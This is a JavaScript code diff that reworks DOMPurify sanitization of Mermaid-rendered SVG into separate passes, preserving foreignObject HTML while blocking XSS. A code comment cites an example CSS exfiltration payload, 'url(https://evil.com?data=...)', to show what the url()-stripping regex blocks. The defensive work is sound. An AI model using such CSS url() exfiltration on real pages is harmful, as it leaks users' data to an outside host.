@@ -563,17 +563,71 @@ export async function renderMarkdown() {
             try {
                 const { svg } = await mermaid.render(element.id + '-svg', element.textContent);
 
-                // Sanitize SVG BEFORE any DOM parsing to satisfy CodeQL security requirements
-                // Configure DOMPurify to preserve elements Mermaid needs while blocking XSS
-                const sanitizedSvgString = DOMPurify.sanitize(svg, {
-                    USE_PROFILES: { svg: true, svgFilters: true },
-                    ADD_TAGS: ['foreignObject'],
-                    ADD_ATTR: ['xmlns', 'style', 'class', 'transform', 'x', 'y', 'width', 'height'],
+                // TWO-PASS SANITIZATION: Preserves foreignObject HTML while blocking XSS
+                // The SVG profile strips HTML inside foreignObject, so we extract it first,
+                // sanitize the SVG structure, then re-inject the sanitized HTML content.
+
+                // PASS 1: Parse raw SVG and extract foreignObject innerHTML BEFORE sanitization
+                const parser = new DOMParser();
+
+                // Mermaid may output xlink:href without xmlns:xlink declaration (Mermaid bug)
+                // Fix this BEFORE parsing to avoid namespace errors
+                let fixedSvg = svg;
+                if (svg.includes('xlink:href') && !svg.includes('xmlns:xlink')) {
+                    fixedSvg = svg.replace('<svg', '<svg xmlns:xlink="http://www.w3.org/1999/xlink"');
+                }
+
+                const rawSvgDoc = parser.parseFromString(fixedSvg, 'image/svg+xml');
+
+                // Check for parse errors in raw SVG (shouldn't happen, but be defensive)
+                const rawParseError = rawSvgDoc.querySelector('parsererror');
+                if (rawParseError || !rawSvgDoc.documentElement) {
+                    throw new Error('Mermaid SVG parse error: ' +
+                        (rawParseError ? rawParseError.textContent : 'Invalid SVG structure'));
+                }
+
+                const savedForeignObjectContent = new Map();
+
+                rawSvgDoc.querySelectorAll('foreignObject').forEach((fo, index) => {
+                    // Save the raw HTML content before DOMPurify strips it
+                    savedForeignObjectContent.set(index, fo.innerHTML);
+                    // Mark with index so we can match after sanitization
+                    fo.setAttribute('data-fo-idx', index);
                 });
 
-                // Parse the sanitized SVG string
-                const parser = new DOMParser();
-                const svgDoc = parser.parseFromString(sanitizedSvgString, 'image/svg+xml');
+                // Get the marked SVG string
+                const markedSvg = rawSvgDoc.documentElement.outerHTML;
+
+                // Verify we have valid SVG content
+                if (!markedSvg || (!markedSvg.startsWith('<svg') && !markedSvg.startsWith('<SVG'))) {
+                    throw new Error('Mermaid SVG generation failed: Invalid output');
+                }
+
+                // PASS 2: Sanitize SVG structure (foreignObject content will be stripped)
+                const sanitizedSvgString = DOMPurify.sanitize(markedSvg, {
+                    USE_PROFILES: { svg: true, svgFilters: true },
+                    ADD_TAGS: ['foreignObject'],
+                    ADD_ATTR: [
+                        'xmlns', 'xmlns:xlink',           // XML namespaces
+                        'xlink:href', 'href',             // Links (xlink: for legacy, href for SVG2)
+                        'style', 'class', 'transform',    // Styling
+                        'x', 'y', 'width', 'height',      // Dimensions
+                        'data-fo-idx',                    // Our foreignObject index marker
+                    ],
+                    ADD_URI_SAFE_ATTR: ['xlink:href', 'href'],
+                });
+
+                // Ensure xmlns:xlink namespace is declared if xlink:href is used
+                let finalSvgString = sanitizedSvgString;
+                if (finalSvgString.includes('xlink:href') && !finalSvgString.includes('xmlns:xlink')) {
+                    finalSvgString = finalSvgString.replace(
+                        '<svg',
+                        '<svg xmlns:xlink="http://www.w3.org/1999/xlink"'
+                    );
+                }
+
+                // Parse the sanitized SVG
+                const svgDoc = parser.parseFromString(finalSvgString, 'image/svg+xml');
 
                 // Check for parse errors
                 const parseError = svgDoc.querySelector('parsererror');
@@ -581,24 +635,27 @@ export async function renderMarkdown() {
                     throw new Error('SVG parse error: ' + parseError.textContent);
                 }
 
-                // Sanitize HTML content inside foreignObject elements (where XSS risk exists)
-                // The SVG structure itself (paths, rects, transforms) is safe - only the
-                // embedded HTML in foreignObject can contain malicious scripts/handlers
+                // PASS 3: Re-inject saved foreignObject content with HTML sanitization
+                // This preserves styling (background-color, etc.) while blocking XSS
                 svgDoc.querySelectorAll('foreignObject').forEach(fo => {
-                    // Strip url() from style attributes to prevent data exfiltration
-                    // but allow colors, backgrounds, positioning, etc.
-                    const sanitized = DOMPurify.sanitize(fo.innerHTML, {
-                        ALLOWED_TAGS: ['div', 'span', 'p', 'br', 'b', 'i', 'strong', 'em', '#text'],
-                        ALLOWED_ATTR: ['class', 'style', 'xmlns'],
-                        KEEP_CONTENT: true,
-                    });
-                    // Remove url() from any style attributes (blocks data exfiltration)
-                    // Allows: background-color: #fff; background: red;
-                    // Blocks: background: url(https://evil.com?data=...);
-                    fo.innerHTML = sanitized.replace(/url\s*\([^)]*\)/gi, '');
+                    const idx = parseInt(fo.getAttribute('data-fo-idx'), 10);
+                    if (savedForeignObjectContent.has(idx)) {
+                        // Sanitize the saved HTML content before re-injecting
+                        const sanitizedHtml = DOMPurify.sanitize(savedForeignObjectContent.get(idx), {
+                            ALLOWED_TAGS: ['div', 'span', 'p', 'br', 'b', 'i', 'strong', 'em'],
+                            ALLOWED_ATTR: ['class', 'style', 'xmlns'],
+                            KEEP_CONTENT: true,
+                        });
+                        // Strip url() to prevent data exfiltration via CSS
+                        // Allows: background-color: #e8e8e8; padding: 5px;
+                        // Blocks: background: url(https://evil.com?data=...);
+                        fo.innerHTML = sanitizedHtml.replace(/url\s*\([^)]*\)/gi, '');
+                    }
+                    // Clean up the marker attribute
+                    fo.removeAttribute('data-fo-idx');
                 });
 
-                // Now safe to insert - foreignObject contents have been sanitized
+                // Now safe to insert - both SVG structure and foreignObject HTML are sanitized
                 const sanitizedSvg = svgDoc.documentElement;
                 element.innerHTML = '';
                 element.appendChild(element.ownerDocument.importNode(sanitizedSvg, true));
